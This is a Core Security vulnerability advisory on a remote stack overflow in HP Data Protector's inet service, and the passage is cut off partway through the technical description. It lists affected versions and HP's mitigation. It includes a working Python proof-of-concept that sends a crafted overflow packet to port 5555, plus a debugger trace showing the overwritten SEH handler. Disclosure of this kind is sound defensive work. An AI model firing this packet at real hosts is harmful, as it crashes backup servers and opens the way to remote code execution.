  HP Data Protector EXEC_CMD Buffer Overflow Vulnerability


1. *Advisory Information*

Title: HP Data Protector EXEC_CMD Buffer Overflow Vulnerability
Advisory ID: CORE-2011-0606
Advisory URL:
http://www.coresecurity.com/content/HP-Data-Protector-EXECCMD-Vulnerability
Date published: 2011-06-29
Date of last update: 2011-06-29
Vendors contacted: HP
Release mode: Coordinated release


2. *Vulnerability Information*

Class: Remote stack overflow [CWE-120]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2011-1866


3. *Vulnerability Description*

HP Data Protector [1] is an automated backup and recovery software for
single-server to enterprise environments. A vulnerability in HP Data
Protector could allow a remote attacker to execute arbitrary code. The
vulnerability is triggered by sending a request to port 5555 of a host
running the "data protector inet" service, part of HP Data Protector.


4. *Vulnerable packages*

   . HP OpenView Storage Data Protector v6.20 (running on Windows).
   . HP OpenView Storage Data Protector v6.11 (running on Windows).
   . HP OpenView Storage Data Protector v6.10 (running on Windows).
   . HP OpenView Storage Data Protector v6.00 (running on Windows).
   . Previous versions may be affected, but were not tested.


5. *Non-vulnerable packages*

   . No fixes are available at the time of publication.


6. *Vendor Information, Solutions and Workarounds*

HP has issued a security bulletin with document ID c02872182 [2]
available through HP Support Center at http://www.hp.com/go/HPSC.

The latest version of HP Data Protector is vulnerable to this issue. HP
has provided the following procedure to mitigate this vulnerability:

   1. Upgrade to Data Protector A.06.20 or subsequent.
   2. Enable encrypted control communication services on cell server and
all clients in cell.

 The upgrade is available for download from
http://hp.com/go/dataprotector then under 'Product Information' click on
'Trials and Demos'.


7. *Credits*

This vulnerability was discovered and researched by Nahuel C. Riva from
Core Security Technologies. Publication was coordinated by Carlos Sarraute.


8. *Technical Description / Proof of Concept Code*

The following python script can be used to reproduce the bug.

/-----
import sys
import socket

from struct import pack

ip = sys.argv[1]
port = int(sys.argv[2]) # default tcp port 5555

target = (ip, port)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(target)

path = 'A' * 5000

packet =  pack('<L', 0x20003220)
packet += pack('<L', 0x00302000)
packet += '\x20'
packet += pack('>H', 0x0020)
packet += pack('<L', 0x00432000)
packet += pack('<L', 0x00303220)
packet += '\x20'
packet += 'omnicheck.exe'
packet += pack('>H', 0x0020)
packet += pack('>H', 0x0020) * 4
packet += pack('<L', 0x30200030)
packet += pack('>H', 0x0020)
packet += path
packet += pack('>H', 0x0000)

plen = pack('>L', len(packet))

s.send(plen + packet)

 By executing this script, the omniinet.exe process crashes in the
following EIP:

/-----
7C8285D3    8B0424           MOV EAX,DWORD PTR SS:[ESP]
7C8285D6    8BE5             MOV ESP,EBP

7C8285D9    C3               RETN

- -----/
 This is part of a function inside the ntdll.dll library, however, if we
look the SEH chain, we can see that the SEH handler was overwritten with
the value 0x00410041 (the unicode value for "AA"):

/-----

 The problem is in the 0041D170 function. This function does a blind
copy of the string passed in the packet as a path:
